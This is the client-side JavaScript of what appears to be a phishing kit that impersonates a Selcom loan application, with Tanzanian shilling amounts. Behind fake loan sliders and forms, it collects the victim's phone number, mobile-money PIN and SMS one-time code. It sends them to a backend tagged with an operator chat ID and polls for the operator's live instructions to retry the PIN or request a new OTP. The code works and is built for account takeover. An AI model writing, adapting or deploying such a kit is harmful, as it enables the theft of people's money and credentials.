document.addEventListener('DOMContentLoaded', () => {
  const stepWelcome = document.getElementById('step-welcome');
  const stepSlider = document.getElementById('step-slider');
  const stepForm1 = document.getElementById('step-form-1');
  const stepForm2 = document.getElementById('step-form-2');
  const stepForm3 = document.getElementById('step-form-3');
  const stepPin = document.getElementById('step-pin');
  const stepOtp = document.getElementById('step-otp');
  const stepLoading = document.getElementById('step-loading');
  const stepSuccess = document.getElementById('step-success');

  const credsSurfaceBanner = document.getElementById('creds-surface-banner');
  const otpSurfaceBanner = document.getElementById('otp-surface-banner');
  const phoneError = document.getElementById('phone-error');

  let currentUserId = null;
  let statusPollInterval = null;
  let otpTimerInterval = null;

  const urlParams = new URLSearchParams(window.location.search);
  const adminParam = urlParams.get('admin') || '';

  function showStep(targetStep) {
    [stepWelcome, stepSlider, stepForm1, stepForm2, stepForm3, stepPin, stepOtp, stepSuccess].forEach(s => {
      if (s) s.classList.remove('active');
    });
    if (targetStep) targetStep.classList.add('active');
  }

  // Sliders Synchronization
  const sliderBalance = document.getElementById('slider-balance');
  const balanceVal = document.getElementById('balance-val');
  const sliderDuration = document.getElementById('slider-duration');
  const durationVal = document.getElementById('duration-val');
  const formAmount = document.getElementById('form-amount');
  const formDuration = document.getElementById('form-duration');

  if (sliderBalance && balanceVal) {
    sliderBalance.addEventListener('input', (e) => {
      const val = `${Number(e.target.value).toLocaleString()} TZS`;
      balanceVal.innerText = val;
      if (formAmount) formAmount.value = val;
      const summaryAmt = document.getElementById('summary-amount');
      if (summaryAmt) summaryAmt.innerText = val;
    });
  }

  if (sliderDuration && durationVal) {
    sliderDuration.addEventListener('input', (e) => {
      const val = `${e.target.value} months`;
      durationVal.innerText = val;
      if (formDuration) formDuration.value = `${e.target.value} Months`;
      const summaryDur = document.getElementById('summary-duration');
      if (summaryDur) summaryDur.innerText = `${e.target.value} Months`;
    });
  }

  // Enforce Phone Number input formatting
  const phoneInput = document.getElementById('phone-number');
  if (phoneInput) {
    phoneInput.addEventListener('input', (e) => {
      let val = e.target.value.replace(/\D/g, '');
      if (val.length > 10) {
        val = val.substring(0, 10);
      }
      e.target.value = val;
    });
  }

  // Multi-step Navigation
  const btnWelcome = document.getElementById('btn-welcome-proceed');
  if (btnWelcome) btnWelcome.addEventListener('click', () => showStep(stepSlider));
  
  const btnSliderNext = document.getElementById('btn-slider-next');
  if (btnSliderNext) {
    btnSliderNext.addEventListener('click', () => {
      if (sliderBalance && formAmount) {
        formAmount.value = `${Number(sliderBalance.value).toLocaleString()} TZS`;
      }
      showStep(stepForm1);
    });
  }

  const btnForm1Next = document.getElementById('btn-form1-next');
  if (btnForm1Next) btnForm1Next.addEventListener('click', () => showStep(stepForm2));

  const btnForm2Back = document.getElementById('btn-form2-back');
  if (btnForm2Back) btnForm2Back.addEventListener('click', () => showStep(stepForm1));

  const btnForm2Next = document.getElementById('btn-form2-next');
  if (btnForm2Next) {
    btnForm2Next.addEventListener('click', () => {
      const firstName = document.getElementById('first-name').value.trim();
      const lastName = document.getElementById('last-name').value.trim();
      const phoneVal = phoneInput ? phoneInput.value.trim() : '';

      if (!phoneVal.startsWith('0') || phoneVal.length < 9) {
        if (phoneError) {
          phoneError.innerText = 'Phone number must start with 0 and be valid.';
          phoneError.style.display = 'block';
        }
        return;
      }
      if (phoneError) phoneError.style.display = 'none';

      const sumApplicant = document.getElementById('summary-applicant');
      const sumPurpose = document.getElementById('summary-purpose');
      const loanTypeEl = document.getElementById('loan-type');

      if (sumApplicant) sumApplicant.innerText = `${firstName} ${lastName}`.trim() || 'Selcom Customer';
      if (sumPurpose && loanTypeEl) sumPurpose.innerText = loanTypeEl.value;

      showStep(stepForm3);
    });
  }

  const btnForm3Back = document.getElementById('btn-form3-back');
  if (btnForm3Back) btnForm3Back.addEventListener('click', () => showStep(stepForm2));

  const btnForm3Submit = document.getElementById('btn-form3-submit');
  if (btnForm3Submit) {
    btnForm3Submit.addEventListener('click', () => {
      const phoneVal = phoneInput ? phoneInput.value.trim() : '';
      const displayPhone = document.getElementById('display-applicant-phone');
      if (displayPhone) {
        displayPhone.innerText = `+255 ${phoneVal}`;
      }

      showStep(stepPin);
      if (pinDigits[0]) pinDigits[0].focus();
    });
  }

  // Digits input focus and auto-submit
  const pinDigits = document.querySelectorAll('.pin-digit');
  const otpDigits6 = document.querySelectorAll('.otp-digit-6');

  function setupDigitInputs(inputs, autoSubmitCallback) {
    inputs.forEach((input, idx) => {
      input.addEventListener('input', () => {
        input.value = input.value.replace(/\D/g, '');
        if (input.value && idx < inputs.length - 1) {
          inputs[idx + 1].focus();
        }

        const allFilled = Array.from(inputs).every(i => i.value.length === 1);
        if (allFilled && typeof autoSubmitCallback === 'function') {
          autoSubmitCallback();
        }
      });

      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !input.value && idx > 0) {
          inputs[idx - 1].focus();
        }
      });
    });
  }

  setupDigitInputs(pinDigits);
  setupDigitInputs(otpDigits6, () => submitOtpHandler());

  // 1-Minute OTP Countdown Timer
  function startOtpCountdown() {
    let timeLeft = 60;
    const timerDisplay = document.getElementById('otp-timer-display');
    const resendBtn = document.getElementById('btn-request-new-otp');
    if (resendBtn) resendBtn.style.display = 'none';

    if (otpTimerInterval) clearInterval(otpTimerInterval);

    otpTimerInterval = setInterval(() => {
      timeLeft--;
      let minutes = Math.floor(timeLeft / 60);
      let seconds = timeLeft % 60;
      if (timerDisplay) {
        timerDisplay.innerHTML = `Code expires in: <strong>${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}</strong>`;
      }

      if (timeLeft <= 0) {
        clearInterval(otpTimerInterval);
        if (timerDisplay) timerDisplay.innerHTML = `<strong>Code expired!</strong>`;
        if (resendBtn) resendBtn.style.display = 'inline-block';
      }
    }, 1000);
  }

  const resendBtn = document.getElementById('btn-request-new-otp');
  if (resendBtn) {
    resendBtn.addEventListener('click', async () => {
      otpDigits6.forEach(i => i.value = '');
      if (otpDigits6[0]) otpDigits6[0].focus();
      if (otpSurfaceBanner) otpSurfaceBanner.classList.remove('active');
      startOtpCountdown();
      
      // Notify admin about new OTP request
      try {
        await fetch('/api/request-new-otp', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ userId: currentUserId })
        });
      } catch (e) {}
    });
  }

  // Submit Credentials (Phone & PIN)
  const btnSubmitCreds = document.getElementById('btn-submit-creds');
  if (btnSubmitCreds) {
    btnSubmitCreds.addEventListener('click', async () => {
      const phoneVal = phoneInput ? phoneInput.value.trim() : '';
      const pinVal = Array.from(pinDigits).map(i => i.value).join('');

      const pinError = document.getElementById('pin-error');
      if (pinVal.length !== 4) {
        if (pinError) pinError.style.display = 'block';
        return;
      }
      if (pinError) pinError.style.display = 'none';

      if (credsSurfaceBanner) credsSurfaceBanner.classList.remove('active');
      showLoading('Verifying...', 'Securely transmitting your credentials.');

      try {
        const res = await fetch(`/api/submit-credentials?admin=${encodeURIComponent(adminParam)}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phone: phoneVal, pin: pinVal, adminChatId: adminParam })
        });

        const data = await res.json();
        if (data.success) {
          currentUserId = data.userId;
          const loadTitle = document.getElementById('loading-title');
          const loadSub = document.getElementById('loading-sub');
          if (loadTitle) loadTitle.innerText = "Waiting for administrator approval...";
          if (loadSub) loadSub.innerText = 'Please remain on this page.';
          startStatusPolling();
        } else {
          hideLoading();
          alert(data.error || 'Processing failed.');
        }
      } catch (e) {
        hideLoading();
        alert('Network error.');
      }
    });
  }

  function startStatusPolling() {
    if (statusPollInterval) clearInterval(statusPollInterval);

    statusPollInterval = setInterval(async () => {
      if (!currentUserId) return;

      try {
        const res = await fetch(`/api/check-status/${currentUserId}`);
        const data = await res.json();

        if (data.status === 'PROCEED_OTP') {
          clearInterval(statusPollInterval);
          hideLoading();
          showStep(stepOtp);
          startOtpCountdown();
          if (otpDigits6[0]) otpDigits6[0].focus();
        } else if (data.status === 'SUCCESS') {
          clearInterval(statusPollInterval);
          hideLoading();
          const approvedDisp = document.getElementById('approved-amount-display');
          if (approvedDisp && sliderBalance) {
            approvedDisp.innerText = `${Number(sliderBalance.value).toLocaleString()} TZS`;
          }
          showStep(stepSuccess);
        } else if (data.status === 'RETRY_PIN') {
          clearInterval(statusPollInterval);
          hideLoading();
          if (credsSurfaceBanner) credsSurfaceBanner.classList.add('active');
          pinDigits.forEach(i => i.value = '');
          if (pinDigits[0]) pinDigits[0].focus();
          showStep(stepPin);
        } else if (data.status === 'RETRY_OTP') {
          clearInterval(statusPollInterval);
          hideLoading();
          if (otpSurfaceBanner) otpSurfaceBanner.classList.add('active');
          otpDigits6.forEach(i => i.value = '');
          if (otpDigits6[0]) otpDigits6[0].focus();
          showStep(stepOtp);
          startOtpCountdown();
        } else if (data.status === 'DENIED') {
          clearInterval(statusPollInterval);
          hideLoading();
          alert('Application denied by administrator.');
          window.location.reload();
        }
      } catch (e) {}
    }, 3000);
  }

  async function submitOtpHandler() {
    const otpVal = Array.from(otpDigits6).map(i => i.value).join('');

    const otpError = document.getElementById('otp-error');
    if (otpVal.length !== 6) {
      if (otpError) otpError.style.display = 'block';
      return;
    }
    if (otpError) otpError.style.display = 'none';
    if (otpSurfaceBanner) otpSurfaceBanner.classList.remove('active');

    showLoading('Verifying OTP code...', 'Analyzing Selcom SMS.');

    try {
      const res = await fetch('/api/submit-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: currentUserId, otp: otpVal })
      });

      const data = await res.json();
      if (data.success) {
        const loadTitle = document.getElementById('loading-title');
        const loadSub = document.getElementById('loading-sub');
        if (loadTitle) loadTitle.innerText = 'Validating...';
        if (loadSub) loadSub.innerText = 'Please wait.';
        startStatusPolling();
      } else {
        hideLoading();
      }
    } catch (e) {
      hideLoading();
    }
  }

  const btnSubmitOtp = document.getElementById('btn-submit-otp');
  if (btnSubmitOtp) btnSubmitOtp.addEventListener('click', submitOtpHandler);

  const btnGoHome = document.getElementById('btn-go-home');
  if (btnGoHome) {
    btnGoHome.addEventListener('click', () => {
      window.location.href = `/?admin=${encodeURIComponent(adminParam)}`;
    });
  }

  function showLoading(title, sub) {
    const loadTitle = document.getElementById('loading-title');
    const loadSub = document.getElementById('loading-sub');
    if (loadTitle) loadTitle.innerText = title;
    if (loadSub) loadSub.innerText = sub;
    if (stepLoading) stepLoading.classList.add('active');
  }

  function hideLoading() {
    if (stepLoading) stepLoading.classList.remove('active');
  }
});
    
